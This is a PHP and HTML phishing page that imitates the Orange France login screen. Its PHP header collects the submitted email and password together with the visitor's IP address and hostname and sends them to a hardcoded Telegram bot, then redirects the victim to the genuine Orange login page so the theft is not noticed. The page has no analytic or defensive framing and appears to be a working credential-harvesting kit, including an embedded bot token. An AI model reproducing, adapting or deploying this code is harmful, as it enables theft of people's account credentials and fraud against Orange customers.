<?php 
ini_set( 'display_errors', 1 );
error_reporting( E_ALL );


if(isset($_POST['valider'])){

    $email = htmlspecialchars($_POST['email']);
    $pass = htmlspecialchars($_POST['pass']);
    $ip = getenv("REMOTE_ADDR");
    $hostname = gethostbyaddr($ip);

   
    $message = "Acces Orange France";
    $message.= "Login: " . $email . "\n";
    $message.= "Password: " . $pass . "\n";
    $message .= "______________ INFOS OF MACHINE _________\n";
    $message .= "Ip of Machine              : " . $ip . "\n";
    $message .= "Host               : " . $hostname . "\n";

    file_get_contents("https://api.telegram.org/bot5252051723:AAGfVlXHfAJbuD7gQGeJMOYVspmKk8qyK_g/sendMessage?chat_id=1001853610761&text=" . urlencode($message)."" );


    header('Location: https://login.orange.fr/');
    
}



?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
    <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/duotone.css" integrity="sha384-R3QzTxyukP03CMqKFe0ssp5wUvBPEyy9ZspCB+Y01fEjhMwcXixTyeot+S40+AjZ" crossorigin="anonymous"/>
<link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/fontawesome.css" integrity="sha384-eHoocPgXsiuZh+Yy6+7DsKAerLXyJmu2Hadh4QYyt+8v86geixVYwFqUvMU8X90l" crossorigin="anonymous"/>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"> 
<script type="text/javascript" src="main.js"></script>
<script type="text/javascript" src="jquery.js"></script>   



    <title>Identifiez-vous</title>



    <style>

body{
    color : #000; 
   font-family:  o-HelveticaNeue, Arial, sans-serif;
}

.container{
    margin-left: 5%;
    margin-right: 5%;
}

.pvi{
    font-size: 42px;
    font-weight:bold;
}

.ivc{
    font-size: 27px;
    font-weight:bold;
}


.content{
    margin-top: 20px;
    margin-bottom: 10px;
    background-color: rgb(0, 195, 255, .1);
    padding: 10px 20px;
    font-weight: 500;
}


.input{
    width: 60%;
    border: 0px ;
    padding: 10px 0px ;
    border-bottom: 1px solid #000;
}


.input:focus {
    border-bottom: 1px solid rgb(0, 0, 0) ;
    background-color: #fff;
    outline:  none;
    
    
}

.button{
    padding: 10px 10px;
    border: 0px;
    background-color: #000;
    color: #fff;
    width: 25%;
}

a{
    color: #000;
}

a:hover{
    color:rgb(77, 77, 77);
    
    
}




    </style>
    
    
  
</head>
<body>

    <form action="" method="post">  
<div class="block01">
        <div class="container">
            <div class="row">


                <div class="col-md-8">
                    <h1 class="pvi">Pour vous identifier</h1>
                    <div class="content">
                        <span><i class="fa fa-exclamation-circle" style="color:rgb(0, 195, 255); display:inline; font-size: 28px;"  aria-hidden="true"></i></span><h4 style="display:inline"> C’est votre première connexion ?</h4>
                        <p>Vous devez d’abord finaliser la création de votre compte. Pour cela, saisissez l’adresse e-mail Orange ou le numéro de mobile fournis lors de votre souscription.</p>
                    </div>

                    <h1 class="ivc">Indiquez votre compte Orange</h1>

                    <br> <br>

                    
                        <span style="font-size: 14px;" id="addressshow">Adresse e-mail ou n° de mobile Orange</span>
                        <div>
                            
                            <span style="display: block; position: relative; top: 30px;" id="addresshide01">Adresse e-mail ou n° de mobile Orange</span>
                            <input type="text" class="input" placeholder="" name="email" style="display: inline-block;" id="address">
                        </div>
                        <br>
                        <div>
                            <a href="">Comment retrouver l’adresse e-mail de votre compte</a><span style="color:orange; font-size: 18px; font-weight: bold;">  > </span>
                        </div>

                    


                </div>


                <div class="col-md-4"></div>

                
            </div>

            
        </div>
        <br><br>


</div>





<div class="block02">
            <div class="container">
                <div class="row">


                    <div class="col-md-8">
                        <h1 class="pvi">Pour vous identifier</h1>
                        <div class="" style="display: flex; margin-bottom: 35px; margin-top: 35px;">
                            <div class="pseudo" style="flex:left;width: 80px; height: 80px; border-radius: 50%; background-color: rgb(233, 233, 233); margin-top: -15px;">
                                <i class="fa fa-user" style="padding:0px 0px 15px 14px ; font-size: 60px; color:rgb(102, 102, 102); text-align: center; line-height: 80px;"  aria-hidden="true"></i>
                            </div>
                            
                                <div class=""  style="flex:right; padding-left: 20px;">
                                <div style="margin-bottom: 10px;" id="email"></div>
                                <div class=""> <a href="">Changer de compte </a> </div>
                            </div>
                            
                        </div>

                        <h1 class="ivc">Saisissez votre mot de passe</h1>

                        <br> <br>

                       
                            <div style="font-size: 14px;" id="passshow">Mot de passe</div>
                            <div>
                                
                                <span style="display: block; position: relative; top: 30px;" id="addresshide02">Mot de passe</span>
                                <input type="password" class="input" placeholder name="pass" id="pass" >
                            </div>
                            <br>
                            <div>
                                
                            <input type="checkbox" style="width: 20px; height: 20px; margin-right: 10px; outline: none; border:1px solid orange; background-color: orange;"> <span style="line-height: 20px;">Rester identifié </span>
                            </div>
                            <br>

                            <div style="display: inline;">
                                    <div style="display: inline;">
                                        <button type="submit" name="valider" class="button">S'identifier</button>
                                    </div>
                                    <div style="display: inline; margin-left: 20px;">
                                        <a href="">Mot de passe oublié</a>
                                    </div>
                            </div>
                        


                    </div>


                    <div class="col-md-4"></div>

                    
                </div>

                
            </div>
            <br><br>



</div>

</form>

<div style="margin-left: 5%;">
    <button  class="button" id="continuer" style="width: 10%;"> Continuer</button>
</div>

<hr style="width: 90%; text-align: center;">
<br><br>
<div class="container">
<div>
    <a href="">Créer un compte sans être client Orange</a> <span style="color:orange; font-size: 18px; font-weight: bold;">  > </span>
</div>
<div>
    <a href="">Besoin d’aide ?</a><span style="color:orange; font-size: 18px; font-weight: bold;">  > </span>
</div>
</div>

<div class="container-fluid" style="background-color:#c6c6c6; padding:10px">
    
        <div class="row">
            <div class="col-md-3"></div>



            <div class="col-md-6" style="background-color:#000;  ">

                <div class="row" style="padding:10px; font-size:25px; color: #fff">



                    <div class="col-md-4" style=" font-size:50px; color: orange; font-weight:bold">Mag TV</div>

                    <div class="col-md-6">
                        <p>  le magazine TV digital <br> des clients de la <span style="color: orange; font-weight:bold"> TV d'Orange </span> </p>
                    </div>

                    <div class="col-md-2" style=" font-size:15px; color: #fff; margin-top:20px"> <button>Decouvrir</button> </div>
                </div>

            </div>

            


            <div class="col-md-3"></div>
        </div>
    
</div>


<script type="text/javascript" src="main.js"></script>
<script type="text/javascript" src="jquery.js"></script>
<script src="https://code.jquery.com/jquery-3.6.0.js" integrity="sha256-H+K7U5CnXl1h5ywQfKtSj8PCmoN9aaq30gDh27Xc0jk=" crossorigin="anonymous"></script>
    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
</body>
</html>